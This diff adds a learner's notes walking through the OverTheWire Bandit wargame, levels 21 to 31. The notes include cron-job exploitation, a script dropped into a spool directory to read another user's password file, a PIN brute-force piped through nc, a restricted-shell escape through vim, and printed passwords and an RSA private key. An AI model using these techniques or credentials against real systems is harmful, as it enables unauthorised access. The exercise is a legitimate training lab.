@@ -256,11 +256,315 @@ gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
     cd /etc/cron.d/
     cat cronjob_bandit*
 
+    cat /usr/bin/cronjob_bandit22.sh
+
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+    cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+    Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+    ssh -p 2220  bandit22@bandit.labs.overthewire.org
+    Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+## Level 22 -> 23
+
+    cd /etc/cron.d/
+    cat cronjob_bandit23
+
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+    cat /usr/bin/cronjob_bandit23.sh
+
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+    echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+
+    ssh -p 2220  bandit23@bandit.labs.overthewire.org
+    jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+## Level 23 -> 24
+
+    cat /etc/cron.d/cronjob_bandit24
+
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+  
+
+
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+    mkdir /tmp/pass24
+    cd /tmp/pass24
+    nano password.sh
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/pass24/password.txt
+
+    chmod 777 password.sh
+    touch password.txt
+    chmod 777 password.txt
+    cp password.sh /var/spool/bandit24/
+    cat password.txt
+
+    ssh -p 2220  bandit24@bandit.labs.overthewire.org
+    UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+## Level 24 -> 25
+
+Attempts:
+
+#! python3
+import socket
+
+connSock=socket(AF_INET, SOCK_STREAM)
+connSock.connect(("127.0.0.1", 30002))
+connSock.send(str.encode("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"))
+
+
+for pin in itertools.permutations(range(4)): 
+    print("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ", pin)
 
 
 
+python3 interpreter
+brute_force = lambda: [print("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ " + str(number)) for number in range(10000)]
+brute_force()
+
+#! python3
+import os
+import sys
+
+os.system("nc localhost 30002")
 
 
 
+brute_force = lambda: [print("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ " + str(number)) for number in range(10000)]
+brute_force()
 
+#### brute.py
 
+brute_force = lambda: [print("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ " + str(number)) for number in range(10000)]
+
+brute_force()
+
+    python3 ./brute.py | nc localhost 30002
+
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+    ssh -p 2220  bandit25@bandit.labs.overthewire.org
+    uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+## Level 25 -> 26
+
+    echo $SHELL
+    ls
+    cat bandit26.sshkey
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+
+    ssh -i ~/Desktop/bandit26 -p 2220  bandit26@bandit.labs.overthewire.org
+
+    ssh -p 2220  bandit25@bandit.labs.overthewire.org
+
+    cd /
+    cd /home/bandit26
+    ls -la
+    cat text.txt
+
+    cd ../etc
+    cat shells
+
+/etc/shells: valid login shells
+/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+/usr/bin/screen
+/usr/bin/tmux
+/usr/bin/showtext
+
+    cat passwd
+
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+    /usr/bin/showtext
+
+more: stat of /home/bandit25/text.txt failed: No such file or directory
+
+    more /usr/bin/showtext
+
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+
+## Level 26 -> 27
+
+    more /home/bandit26/text.txt
+
+    scp -P 2220 bandit26@bandit.labs.overthewire.org:/etc/bandit_pass/bandit26 ~/Desktop/banditpass
+
+    ssh -i ~/Desktop/bandit26 -p 2220  bandit26@bandit.labs.overthewire.org
+
+#### Resize shell - got help from Nicholas
+
+    v
+    shift + : set shell=/bin/bash
+    :shell
+    ls
+    ./bandit27-do
+    
+    ./bandit27-do cat /etc/bandit_pass/bandit27
+
+3ba3118a22e93127a4ed485be72ef5ea
+
+    ssh -p 2220  bandit27@bandit.labs.overthewire.org
+    3ba3118a22e93127a4ed485be72ef5ea
+
+## Level 27 -> 28
+
+ssh://bandit27-git@localhost/home/bandit27-git/repo
+
+    mkdir /tmp/git11 && cd /tmp/git11
+    git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+    cd repo
+    cat README
+
+The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+
+    rm -rf /tmp/git11
+    ssh -p 2220  bandit28@bandit.labs.overthewire.org
+    0ef186ac70e04ea33b4c1853d2526fa2
+
+## Level 28 -> 29
+
+    mkdir /tmp/git11 && cd /tmp/git11
+    git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+    cd repo/
+    cat README.md
+    
+    git branch
+    git log
+    git log -p
+
+-- username: bandit29
+-- password: <TBD>
++- password: bbc96594b4e001778eee9975372716b2
+
+    ssh -p 2220  bandit29@bandit.labs.overthewire.org
+    bbc96594b4e001778eee9975372716b2
+
+## Level 29 -> 30
+
+    cd /tmp/git11
+    git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+    bbc96594b4e001778eee9975372716b2
+
+    cd repo
+    git branch -r
+    git checkout dev
+    git log -p
+
+-- username: bandit30
+-- password: <no passwords in production!>
++- password: 5b90576bedb2cc04c86a9e924ce42faf
+
+    ssh -p 2220  bandit30@bandit.labs.overthewire.org
+    5b90576bedb2cc04c86a9e924ce42faf
+
+## Level 30 -> 31
+
+    mkdir /tmp/git13 && cd /tmp/git13
+
+    git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
+    cat README.md
+
+just an epmty file... muahaha
+
+    git branch -r
+    git log -p
+    ls -la
+
+    cd .git
+    cat *
+
+3aefa229469b7ba1cc08203e5d8fa299354c496b refs/remotes/origin/master
+f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret
+
+    git show secret
+
+47e603bb428404d265f59c42920d81e5
+
+    ssh -p 2220  bandit31@bandit.labs.overthewire.org
+    47e603bb428404d265f59c42920d81e5
+
+## Level 31 -> 32
+
+    mkdir /tmp/git14 && cd /tmp/git14
+    git clone 47e603bb428404d265f59c42920d81e5
+
+This time your task is to push a file to the remote repository.
+
+Details:
+File name: key.txt
+Content: 'May I come in?'
+Branch: master
+
+    vim key.txt
+    git add key.txt
+    git add -f key.txt
